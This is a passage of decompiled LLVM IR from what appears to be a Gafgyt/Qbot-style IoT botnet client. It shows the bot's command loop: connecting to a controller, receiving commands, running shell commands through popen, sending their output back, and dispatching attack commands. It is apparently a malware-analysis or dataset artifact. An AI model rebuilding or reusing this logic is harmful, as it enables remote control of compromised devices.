  %v1_eb10 = call i32 @sleep(i32 30)
  %v0_eafc = call i32 @initConnection()
  %v2_eb04 = icmp eq i32 %v0_eafc, 0
  br i1 %v2_eb04, label %dec_label_pc_eb18, label %dec_label_pc_eb0c

dec_label_pc_eb18:                                ; preds = %dec_label_pc_eb0c, %dec_label_pc_eafc.outer
  %v2_eb1c = load i32, i32* @global_var_272d0.45, align 4
  store i32 %v2_eb1c, i32* @r5, align 4
  %v2_eb24 = load i32, i32* @global_var_2d534.79, align 4
  store i32 %v2_eb24, i32* @r0, align 4
  %v1_eb28 = call i32 @__GI_inet_ntoa(i32 %v2_eb24)
  store i32 %v1_eb28, i32* @r4, align 4
  %v0_eb30 = call i32 @getBuild()
  %v0_eb38 = load i32, i32* @r5, align 4
  %v0_eb40 = load i32, i32* @r4, align 4
  store i32 %v0_eb40, i32* @r2, align 4
  %v2_eb44 = call i32 @Rootsprintf(i32 %v0_eb38, i32 ptrtoint (i32* @global_var_1d1ac.561 to i32))
  br label %dec_label_pc_f37c.outer

dec_label_pc_eb68:                                ; preds = %dec_label_pc_ee1c, %dec_label_pc_edc8
  %v3_eb6c = mul i32 %v3_ee10, 4
  %v2_eb78 = load i32, i32* @global_var_2d540.66, align 4
  %v2_eb7c = add i32 %v2_eb78, %v3_eb6c
  %v1_eb80 = inttoptr i32 %v2_eb7c to i32*
  %v2_eb80 = load i32, i32* %v1_eb80, align 4
  store i32 %v2_eb80, i32* @r0, align 4
  %v3_eb90 = call i32 @__libc_waitpid(i32 %v2_eb80, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_eb90, 1
  br i1 %tmp111, label %dec_label_pc_edbc, label %dec_label_pc_ebf4

dec_label_pc_ebb0:                                ; preds = %dec_label_pc_ec50, %dec_label_pc_ebf4
  %v2_ebb4 = load i32, i32* @global_var_2d540.66, align 4
  %v3_ebc0 = mul i32 %v1_eba4, 4
  %v1_ebb8 = add i32 %v3_ebc0, -4
  %v2_ebc4 = add i32 %v1_ebb8, %v2_ebb4
  %v2_ebdc = add i32 %v2_ebb4, %v3_ebc0
  %v1_ebe0 = inttoptr i32 %v2_ebdc to i32*
  %v2_ebe0 = load i32, i32* %v1_ebe0, align 4
  %v2_ebe4 = inttoptr i32 %v2_ebc4 to i32*
  store i32 %v2_ebe0, i32* %v2_ebe4, align 4
  br label %dec_label_pc_ebf4

dec_label_pc_ebf4:                                ; preds = %dec_label_pc_eb68, %dec_label_pc_ebb0
  %v3_eba0.sink = phi i32 [ %v1_eba4, %dec_label_pc_ebb0 ], [ %v3_ee10, %dec_label_pc_eb68 ]
  %v1_eba4 = add i32 %v3_eba0.sink, 1
  %v2_ec10 = load i32, i32* @global_var_272d8.63, align 4
  %v5_ec10 = load i32, i32* @global_var_272dc.64, align 4
  %tmp112 = icmp ugt i32 %v5_ec10, %v1_eba4
  br i1 %tmp112, label %dec_label_pc_ebb0, label %dec_label_pc_ec38

dec_label_pc_ec38:                                ; preds = %dec_label_pc_ebf4
  %v9_ec48 = icmp eq i32 %v5_ec10, %v1_eba4
  br i1 %v9_ec48, label %dec_label_pc_ec50, label %dec_label_pc_ec68

dec_label_pc_ec50:                                ; preds = %dec_label_pc_ec38
  %v9_ec60 = icmp eq i32 %v2_ec10, 0
  br i1 %v9_ec60, label %dec_label_pc_ec68, label %dec_label_pc_ebb0

dec_label_pc_ec68:                                ; preds = %dec_label_pc_ec50, %dec_label_pc_ec38
  %v2_ec6c = load i32, i32* @global_var_2d540.66, align 4
  %v3_ec78 = mul i32 %v1_eba4, 4
  %v1_ec70 = add i32 %v3_ec78, -4
  %v2_ec7c = add i32 %v1_ec70, %v2_ec6c
  %v2_ec84 = inttoptr i32 %v2_ec7c to i32*
  store i32 0, i32* %v2_ec84, align 4
  %v2_ec8c = load i32, i32* @global_var_272d8.63, align 4
  %v5_ec8c = load i32, i32* @global_var_272dc.64, align 4
  %v2_ec98 = add i32 %v2_ec8c, -1
  %v3_ec98 = icmp ne i32 %v2_ec8c, 0
  %v3_ec9c = add i32 %v5_ec8c, -1
  %v4_ec9c = zext i1 %v3_ec98 to i32
  %v5_ec9c = add i32 %v3_ec9c, %v4_ec9c
  store i32 %v2_ec98, i32* @global_var_272d8.63, align 4
  store i32 %v5_ec9c, i32* @global_var_272dc.64, align 4
  %v3_ecb8 = icmp eq i32 %v2_ec8c, 0
  %v4_ecbc = zext i1 %v3_ecb8 to i32
  %v5_ecbc = add i32 %v5_ec9c, %v4_ecbc
  %v3_ecc0 = udiv i32 %v2_ec8c, 1073741824
  %v3_ecc4 = mul i32 %v5_ecbc, 4
  %v2_ecc8 = or i32 %v3_ecc4, %v3_ecc0
  store i32 %v2_ecc8, i32* @r4, align 4
  %v3_eccc = mul i32 %v2_ec8c, 4
  %v1_ecd4 = call i32 @malloc(i32 %v3_eccc)
  br label %dec_label_pc_ed2c

dec_label_pc_ecec:                                ; preds = %dec_label_pc_ed88, %dec_label_pc_ed2c
  %v3_ecf0 = mul i32 %v3_ed7c, 4
  %v2_ecfc = add i32 %v3_ecf0, %v1_ecd4
  %v2_ed10 = load i32, i32* @global_var_2d540.66, align 4
  %v2_ed14 = add i32 %v2_ed10, %v3_ecf0
  %v1_ed18 = inttoptr i32 %v2_ed14 to i32*
  %v2_ed18 = load i32, i32* %v1_ed18, align 4
  %v2_ed1c = inttoptr i32 %v2_ecfc to i32*
  store i32 %v2_ed18, i32* %v2_ed1c, align 4
  %v1_ed24 = add i32 %v3_ed7c, 1
  br label %dec_label_pc_ed2c

dec_label_pc_ed2c:                                ; preds = %dec_label_pc_ec68, %dec_label_pc_ecec
  %v3_ed7c = phi i32 [ 0, %dec_label_pc_ec68 ], [ %v1_ed24, %dec_label_pc_ecec ]
  %v2_ed48 = load i32, i32* @global_var_272d8.63, align 4
  %v5_ed48 = load i32, i32* @global_var_272dc.64, align 4
  %tmp114 = icmp ugt i32 %v5_ed48, %v3_ed7c
  br i1 %tmp114, label %dec_label_pc_ecec, label %dec_label_pc_ed70

dec_label_pc_ed70:                                ; preds = %dec_label_pc_ed2c
  %v9_ed80 = icmp eq i32 %v5_ed48, %v3_ed7c
  br i1 %v9_ed80, label %dec_label_pc_ed88, label %dec_label_pc_eda0

dec_label_pc_ed88:                                ; preds = %dec_label_pc_ed70
  %v9_ed98 = icmp eq i32 %v2_ed48, 0
  br i1 %v9_ed98, label %dec_label_pc_eda0, label %dec_label_pc_ecec

dec_label_pc_eda0:                                ; preds = %dec_label_pc_ed88, %dec_label_pc_ed70
  %v2_eda4 = load i32, i32* @global_var_2d540.66, align 4
  store i32 %v2_eda4, i32* @r0, align 4
  %v0_edac = call i32 @free()
  store i32 %v1_ecd4, i32* @global_var_2d540.66, align 4
  br label %dec_label_pc_edbc

dec_label_pc_edbc:                                ; preds = %dec_label_pc_eb68, %dec_label_pc_eda0
  %v1_edc0 = add i32 %v3_ee10, 1
  br label %dec_label_pc_edc8

dec_label_pc_edc8:                                ; preds = %dec_label_pc_f37c, %dec_label_pc_edbc
  %v3_ee10 = phi i32 [ %v1_edc0, %dec_label_pc_edbc ], [ 0, %dec_label_pc_f37c ]
  %v3_edd0 = ashr i32 %v3_ee10, 31
  %v2_ede0 = load i32, i32* @global_var_272d8.63, align 4
  %v5_ede0 = load i32, i32* @global_var_272dc.64, align 4
  %v3_edfc = icmp uge i32 %v5_ede0, %v3_ee10
  %v9_edfc = icmp eq i32 %v5_ede0, %v3_ee10
  %v2_ee00 = xor i1 %v9_edfc, true
  %v3_ee00 = and i1 %v3_edfc, %v2_ee00
  br i1 %v3_ee00, label %dec_label_pc_eb68, label %dec_label_pc_ee04

dec_label_pc_ee04:                                ; preds = %dec_label_pc_edc8
  br i1 %v9_edfc, label %dec_label_pc_ee1c, label %dec_label_pc_ee34

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ee04
  %tmp = icmp ugt i32 %v2_ede0, %v3_edd0
  br i1 %tmp, label %dec_label_pc_eb68, label %dec_label_pc_ee34

dec_label_pc_ee34:                                ; preds = %dec_label_pc_ee04, %dec_label_pc_ee1c
  %v2_ee48 = add i32 %v5_f39c, %v2_f38c
  %v3_ee48 = inttoptr i32 %v2_ee48 to i8*
  store i8 0, i8* %v3_ee48, align 1
  %v2_ee64 = call i32 @trim(i8* %v4_f39c)
  %v9_ee7c = call i32 @strstr(i32 %v2_f38c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1cc08.47, i32 0, i32 0), i32 %v2_ee48, i32 %v2_f38c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_ee7c, i32* @r2, align 4
  %v9_ee90 = icmp eq i32 %v9_ee7c, %v2_f38c
  br i1 %v9_ee90, label %dec_label_pc_ee98, label %dec_label_pc_eeb0

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee34
  %v2_ee9c = load i32, i32* @global_var_272d0.45, align 4
  %v3_eea8 = call i32 @Rootsprintf(i32 %v2_ee9c, i32 ptrtoint ([5 x i8]* @global_var_1d214.566 to i32))
  br label %dec_label_pc_f37c

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_ee34
  %v8_eec4 = call i32 @strstr(i32 %v2_f38c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1d21c.568, i32 0, i32 0), i32 %v9_ee7c, i32 %v2_f38c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_eed8 = icmp eq i32 %v8_eec4, %v2_f38c
  br i1 %v9_eed8, label %dec_label_pc_eee0, label %dec_label_pc_ef0c

dec_label_pc_eee0:                                ; preds = %dec_label_pc_eeb0
  %v1_eee4 = add i32 %stack_var_-96.2.ph, 1
  %v2_eef4 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_1d228.570 to i32))
  %v7_ef00 = icmp slt i32 %v1_eee4, 21
  br i1 %v7_ef00, label %dec_label_pc_eafc.outer, label %dec_label_pc_ef04

dec_label_pc_ef04:                                ; preds = %dec_label_pc_eee0
  %v2_ef08 = call i32 @__GI_exit(i16 0)
  br label %dec_label_pc_ef0c

dec_label_pc_ef0c:                                ; preds = %dec_label_pc_eeb0, %dec_label_pc_ef04
  %stack_var_-96.1 = phi i32 [ %v1_eee4, %dec_label_pc_ef04 ], [ %stack_var_-96.2.ph, %dec_label_pc_eeb0 ]
  %v2_ef20 = load i8, i8* %v4_f39c, align 4
  %v7_ef24 = icmp eq i8 %v2_ef20, 33
  br i1 %v7_ef24, label %dec_label_pc_ef48, label %dec_label_pc_f37c.outer

dec_label_pc_ef48:                                ; preds = %dec_label_pc_ef0c, %dec_label_pc_ef58
  %v3_ef2c.sink = phi i8* [ %storemerge8, %dec_label_pc_ef58 ], [ %v4_f39c, %dec_label_pc_ef0c ]
  %v4_ef2c = ptrtoint i8* %v3_ef2c.sink to i32
  %v1_ef30 = add i32 %v4_ef2c, 1
  %storemerge8 = inttoptr i32 %v1_ef30 to i8*
  %v2_ef4c = load i8, i8* %storemerge8, align 1
  %v7_ef50 = icmp eq i8 %v2_ef4c, 32
  br i1 %v7_ef50, label %dec_label_pc_ef68, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef48
  %v2_ef5c = load i8, i8* %storemerge8, align 1
  %v2_ef60 = icmp eq i8 %v2_ef5c, 0
  br i1 %v2_ef60, label %dec_label_pc_ef68, label %dec_label_pc_ef48

dec_label_pc_ef68:                                ; preds = %dec_label_pc_ef58, %dec_label_pc_ef48
  %v2_ef6c = load i8, i8* %storemerge8, align 1
  %v2_ef70 = icmp eq i8 %v2_ef6c, 0
  br i1 %v2_ef70, label %dec_label_pc_f37c.outer, label %dec_label_pc_ef78

dec_label_pc_ef78:                                ; preds = %dec_label_pc_ef68
  store i8 0, i8* %storemerge8, align 1
  %v3_ef98 = call i32 @strlen(i8* %v5_ef8c)
  %v2_efa8 = add i32 %v3_ef98, %v2_f38c
  %v1_efac = add i32 %v2_efa8, 2
  %v5_efb0 = inttoptr i32 %v1_efac to i8*
  %v1_efe0 = add i32 %v2_efa8, 1
  br label %dec_label_pc_efdc

dec_label_pc_efb8:                                ; preds = %dec_label_pc_f004, %dec_label_pc_efdc
  %v3_efc8 = call i32 @strlen(i8* %v5_efb0)
  %v2_efd0 = add i32 %v1_efe0, %v3_efc8
  %v3_efd8 = inttoptr i32 %v2_efd0 to i8*
  store i8 0, i8* %v3_efd8, align 1
  br label %dec_label_pc_efdc

dec_label_pc_efdc:                                ; preds = %dec_label_pc_ef78, %dec_label_pc_efb8
  %v3_efec = call i32 @strlen(i8* %v5_efb0)
  %v2_eff4 = add i32 %v1_efe0, %v3_efec
  %v1_eff8 = inttoptr i32 %v2_eff4 to i8*
  %v2_eff8 = load i8, i8* %v1_eff8, align 1
  %v7_effc = icmp eq i8 %v2_eff8, 10
  br i1 %v7_effc, label %dec_label_pc_efb8, label %dec_label_pc_f004

dec_label_pc_f004:                                ; preds = %dec_label_pc_efdc
  store i32 %v1_efe0, i32* @r4, align 4
  %v3_f014 = call i32 @strlen(i8* %v5_efb0)
  %v0_f01c = load i32, i32* @r4, align 4
  %v2_f01c = add i32 %v0_f01c, %v3_f014
  %v1_f020 = inttoptr i32 %v2_f01c to i8*
  %v2_f020 = load i8, i8* %v1_f020, align 1
  %v7_f024 = icmp eq i8 %v2_f020, 13
  br i1 %v7_f024, label %dec_label_pc_efb8, label %dec_label_pc_f02c

dec_label_pc_f02c:                                ; preds = %dec_label_pc_f004
  %v2_f04828 = load i8, i8* %v5_efb0, align 1
  %v7_f04c32 = icmp eq i8 %v2_f04828, 32
  br i1 %v7_f04c32, label %dec_label_pc_f064, label %dec_label_pc_f054

dec_label_pc_f038:                                ; preds = %dec_label_pc_f054
  %v1_f03c = add i32 %v4_f04434, 1
  %v5_f040 = inttoptr i32 %v1_f03c to i8*
  %v2_f048 = load i8, i8* %v5_f040, align 1
  %v7_f04c = icmp eq i8 %v2_f048, 32
  br i1 %v7_f04c, label %dec_label_pc_f064, label %dec_label_pc_f054

dec_label_pc_f054:                                ; preds = %dec_label_pc_f02c, %dec_label_pc_f038
  %v4_f04434 = phi i32 [ %v1_f03c, %dec_label_pc_f038 ], [ %v1_efac, %dec_label_pc_f02c ]
  %stack_var_-64.033 = phi i8* [ %v5_f040, %dec_label_pc_f038 ], [ %v5_efb0, %dec_label_pc_f02c ]
  %v2_f058 = load i8, i8* %stack_var_-64.033, align 1
  %v2_f05c = icmp eq i8 %v2_f058, 0
  br i1 %v2_f05c, label %dec_label_pc_f064, label %dec_label_pc_f038

dec_label_pc_f064:                                ; preds = %dec_label_pc_f038, %dec_label_pc_f054, %dec_label_pc_f02c
  %stack_var_-64.0.lcssa = phi i8* [ %v5_efb0, %dec_label_pc_f02c ], [ %v5_f040, %dec_label_pc_f038 ], [ %stack_var_-64.033, %dec_label_pc_f054 ]
  %v4_f044.lcssa = phi i32 [ %v1_efac, %dec_label_pc_f02c ], [ %v1_f03c, %dec_label_pc_f038 ], [ %v4_f04434, %dec_label_pc_f054 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_f074 = add i32 %v4_f044.lcssa, 1
  %v2_f0b839 = load i8, i8* %v5_efb0, align 1
  %v2_f0bc41 = icmp eq i8 %v2_f0b839, 0
  br i1 %v2_f0bc41, label %dec_label_pc_f0c4, label %dec_label_pc_f088

dec_label_pc_f088:                                ; preds = %dec_label_pc_f064, %dec_label_pc_f088
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_f088 ], [ %v5_efb0, %dec_label_pc_f064 ]
  %storemerge1442 = phi i32 [ %v1_f0ac, %dec_label_pc_f088 ], [ %v1_efac, %dec_label_pc_f064 ]
  %v2_f08c = load i8, i8* %storemerge743, align 1
  %v3_f08c = zext i8 %v2_f08c to i32
  %v1_f094 = call i32 @__GI_toupper(i32 %v3_f08c)
  %v1_f0a4 = trunc i32 %v1_f094 to i8
  store i8 %v1_f0a4, i8* %storemerge743, align 1
  %v1_f0ac = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_f0ac to i8*
  %v2_f0b8 = load i8, i8* %storemerge7, align 1
  %v2_f0bc = icmp eq i8 %v2_f0b8, 0
  br i1 %v2_f0bc, label %dec_label_pc_f0c4, label %dec_label_pc_f088

dec_label_pc_f0c4:                                ; preds = %dec_label_pc_f088, %dec_label_pc_f064
  store i32 ptrtoint ([11 x i8]* @global_var_1d23c.572 to i32), i32* @r1, align 4
  %v4_f0d0 = call i32 @__GI_strcoll(i8* %v5_efb0, i32 ptrtoint ([11 x i8]* @global_var_1d23c.572 to i32))
  store i32 %v4_f0d0, i32* @r0, align 4
  %v2_f0d8 = icmp eq i32 %v4_f0d0, 0
  br i1 %v2_f0d8, label %dec_label_pc_f0e0, label %dec_label_pc_f1e8

dec_label_pc_f0e0:                                ; preds = %dec_label_pc_f0c4
  %v0_f0e0 = call i32 @listFork()
  %v2_f0e8 = icmp eq i32 %v0_f0e0, 0
  br i1 %v2_f0e8, label %dec_label_pc_f0f0, label %dec_label_pc_f37c.outer

dec_label_pc_f0f0:                                ; preds = %dec_label_pc_f0e0
  store i32 1024, i32* @r2, align 4
  %v3_f108 = call i32 @__GI_memset(i8* %v2_f108, i32 0)
  %v7_f128 = call i32 @szprintf(i32 %v2_f0f8, i32 ptrtoint ([8 x i8]* @global_var_1d248.574 to i32), i32 %v1_f074, i32 %v2_f0f8, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v3_f144 = call i32 @fdpopen(i32 %v2_f0f8, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_1d178.547, i32 0, i32 0))
  br label %dec_label_pc_f1b0

dec_label_pc_f154:                                ; preds = %dec_label_pc_f1b0
  %v2_f164 = call i32 @trim(i8* %v2_f108)
  %v2_f16c = load i32, i32* @global_var_272d0.45, align 4
  store i32 %v2_f0f8, i32* @r2, align 4
  %v3_f188 = call i32 @Rootsprintf(i32 %v2_f16c, i32 ptrtoint ([3 x i8]* @global_var_1d250.576 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_f1a4 = call i32 @__GI_memset(i8* %v2_f108, i32 0)
  %v1_f1ac = call i32 @sleep(i32 1)
  br label %dec_label_pc_f1b0

dec_label_pc_f1b0:                                ; preds = %dec_label_pc_f0f0, %dec_label_pc_f154
  %v4_f1c8 = call i32 @fdgets(i32 %v2_f0f8, i32 1024, i32 %v3_f144, i32 %v2_f0f8)
  %v2_f1d0 = icmp eq i32 %v4_f1c8, 0
  br i1 %v2_f1d0, label %dec_label_pc_f1d8, label %dec_label_pc_f154

dec_label_pc_f1d8:                                ; preds = %dec_label_pc_f1b0
  %v1_f1dc = call i32 @fdpclose(i32 %v3_f144)
  %v2_f1e4 = call i32 @__GI_exit(i16 0)
  br label %dec_label_pc_f1e8

dec_label_pc_f1e8:                                ; preds = %dec_label_pc_f0c4, %dec_label_pc_f1d8
  %v2_f1fc = call i32 @__GI_strtok(i32 %v1_f074, i32 ptrtoint (i32* @global_var_1d254.578 to i32))
  store i32 %v1_efac, i32* %stack_var_-624, align 4
  %v2_f30046 = icmp eq i32 %v2_f1fc, 0
  br i1 %v2_f30046, label %dec_label_pc_f308, label %dec_label_pc_f214

dec_label_pc_f214:                                ; preds = %dec_label_pc_f1e8, %dec_label_pc_f2e8
  %stack_var_-36.049.in = phi i32 [ %v2_f2f0, %dec_label_pc_f2e8 ], [ %v2_f1fc, %dec_label_pc_f1e8 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_f2e8 ], [ 1, %dec_label_pc_f1e8 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_f218 = load i8, i8* %stack_var_-36.049, align 1
  %v7_f21c = icmp eq i8 %v2_f218, 10
  br i1 %v7_f21c, label %dec_label_pc_f2e8, label %dec_label_pc_f224

dec_label_pc_f224:                                ; preds = %dec_label_pc_f214
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_f230 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f238 = add i32 %v3_f230, 1
  %v1_f240 = call i32 @malloc(i32 %v1_f238)
  %v0_f254 = load i32, i32* @r4, align 4
  %v3_f254 = mul i32 %v0_f254, 4
  %v2_f260 = add i32 %v2_f25c, %v3_f254
  %v2_f264 = inttoptr i32 %v2_f260 to i32*
  store i32 %v1_f240, i32* %v2_f264, align 4
  %v3_f274 = mul i32 %stack_var_-40.147, 4
  %v2_f27c = add i32 %v3_f274, %v19_e774
  %v2_f280 = add i32 %v2_f27c, -600
  %v1_f284 = inttoptr i32 %v2_f280 to i32*
  %v2_f284 = load i32, i32* %v1_f284, align 4
  store i32 %v2_f284, i32* @r4, align 4
  %v3_f290 = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_f298 = add i32 %v3_f290, 1
  %v0_f29c = load i32, i32* @r4, align 4
  store i32 %v1_f298, i32* @r2, align 4
  %v2_f2a8 = inttoptr i32 %v0_f29c to i8*
  %v3_f2a8 = call i32 @__GI_memset(i8* %v2_f2a8, i32 0)
  %v2_f2c8 = load i32, i32* %v1_f284, align 4
  store i32 %stack_var_-36.049.in, i32* @r1, align 4
  %v3_f2d8 = inttoptr i32 %v2_f2c8 to i8*
  %v4_f2d8 = call i32 @strcpy(i8* %v3_f2d8, i32 %stack_var_-36.049.in)
  %v1_f2e0 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_f2e8

dec_label_pc_f2e8:                                ; preds = %dec_label_pc_f214, %dec_label_pc_f224
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_f214 ], [ %v1_f2e0, %dec_label_pc_f224 ]
  %v2_f2f0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1d254.578 to i32))
  %v2_f300 = icmp eq i32 %v2_f2f0, 0
  br i1 %v2_f300, label %dec_label_pc_f308, label %dec_label_pc_f214

dec_label_pc_f308:                                ; preds = %dec_label_pc_f2e8, %dec_label_pc_f1e8
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_f1e8 ], [ %stack_var_-40.0, %dec_label_pc_f2e8 ]
  %v3_f314 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_f320 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_f320, label %dec_label_pc_f37c.outer, label %dec_label_pc_f338.lr.ph

dec_label_pc_f338.lr.ph:                          ; preds = %dec_label_pc_f308
  br label %dec_label_pc_f338

dec_label_pc_f338:                                ; preds = %dec_label_pc_f338.lr.ph, %dec_label_pc_f338
  %storemerge15128 = phi i32 [ 1, %dec_label_pc_f338.lr.ph ], [ %v1_f364, %dec_label_pc_f338 ]
  %v3_f344 = mul i32 %storemerge15128, 4
  %v2_f34c = add i32 %v3_f344, %v19_e774
  %v2_f350 = add i32 %v2_f34c, -600
  %v1_f354 = inttoptr i32 %v2_f350 to i32*
  %v2_f354 = load i32, i32* %v1_f354, align 4
  store i32 %v2_f354, i32* @r0, align 4
  %v0_f35c = call i32 @free()
  %v1_f364 = add nuw nsw i32 %storemerge15128, 1
  %v5_f378 = icmp slt i32 %v1_f364, %stack_var_-40.1.lcssa
  br i1 %v5_f378, label %dec_label_pc_f338, label %dec_label_pc_f37c.outer

dec_label_pc_f37c.outer:                          ; preds = %dec_label_pc_f338, %dec_label_pc_ef0c, %dec_label_pc_f0e0, %dec_label_pc_f308, %dec_label_pc_ef68, %dec_label_pc_eb18
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_eb18 ], [ %stack_var_-96.1, %dec_label_pc_ef68 ], [ %stack_var_-96.1, %dec_label_pc_f308 ], [ %stack_var_-96.1, %dec_label_pc_f0e0 ], [ %stack_var_-96.1, %dec_label_pc_ef0c ], [ %stack_var_-96.1, %dec_label_pc_f338 ]
  br label %dec_label_pc_f37c

dec_label_pc_f37c:                                ; preds = %dec_label_pc_f37c.outer, %dec_label_pc_ee98
  %v2_f380 = load i32, i32* @global_var_272d0.45, align 4
  %v5_f39c = call i32 @recvLine(i32 %v2_f380, i8* %v4_f39c, i32 4096, i32 %v2_f38c)
  %v3_f3ac = icmp eq i32 %v5_f39c, -1
  br i1 %v3_f3ac, label %dec_label_pc_eafc.outer, label %dec_label_pc_edc8

; uselistorder directives
  uselistorder i32 %v5_f39c, { 1, 0 }
  uselistorder i32 %storemerge15128, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_f2f0, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_f0ac, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_f074, { 1, 0 }
  uselistorder i32 %v1_efe0, { 2, 1, 0 }
  uselistorder i8* %v5_efb0, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_efac, { 3, 0, 2, 1, 4 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_eee4, { 1, 2, 0 }
  uselistorder i1 %v9_edfc, { 1, 0 }
  uselistorder i32 %v3_ee10, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_ed48, { 1, 0 }
  uselistorder i32 %v3_ed7c, { 1, 2, 0, 3 }
  uselistorder i32 %v3_ecf0, { 1, 0 }
  uselistorder i32 %v1_ecd4, { 1, 0 }
  uselistorder i32 %v5_ec10, { 1, 0 }
  uselistorder i32 %v1_eba4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_ebc0, { 1, 0 }
  uselistorder i32 %v2_ebb4, { 1, 0 }
  uselistorder i32 %v2_f0f8, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_f39c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_f38c, { 9, 0, 3, 5, 4, 7, 6, 8, 1, 2 }
  uselistorder i32 %v0_ea5c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_ea10, { 1, 0, 2 }
  uselistorder i32 %v2_e974, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32, i32, i32, i32)* @strstr, { 2, 0, 1, 3 }
  uselistorder i32* @global_var_272d8.63, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_2d540.66, { 0, 2, 3, 4, 5, 6, 7, 8, 1, 9, 10 }
  uselistorder i32 (i32, i32)* @Rootsprintf, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 16, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32* @global_var_2d534.79, { 1, 0, 3, 2 }
  uselistorder i32* @global_var_272d0.45, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_1d178.547, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1d178.547 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 1, 2, 3, 4, 20, 21, 18, 19 }
  uselistorder i32 ptrtoint (i32* @global_var_1d160.543 to i32), { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f37c.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_f338, { 1, 0 }
  uselistorder label %dec_label_pc_f2e8, { 1, 0 }
  uselistorder label %dec_label_pc_f214, { 1, 0 }
  uselistorder label %dec_label_pc_f1e8, { 1, 0 }
  uselistorder label %dec_label_pc_f1b0, { 1, 0 }
  uselistorder label %dec_label_pc_f088, { 1, 0 }
  uselistorder label %dec_label_pc_f064, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f054, { 1, 0 }
  uselistorder label %dec_label_pc_efdc, { 1, 0 }
  uselistorder label %dec_label_pc_ef48, { 1, 0 }
  uselistorder label %dec_label_pc_ef0c, { 1, 0 }
  uselistorder label %dec_label_pc_ee34, { 1, 0 }
  uselistorder label %dec_label_pc_edbc, { 1, 0 }
  uselistorder label %dec_label_pc_ed2c, { 1, 0 }
  uselistorder label %dec_label_pc_ebf4, { 1, 0 }
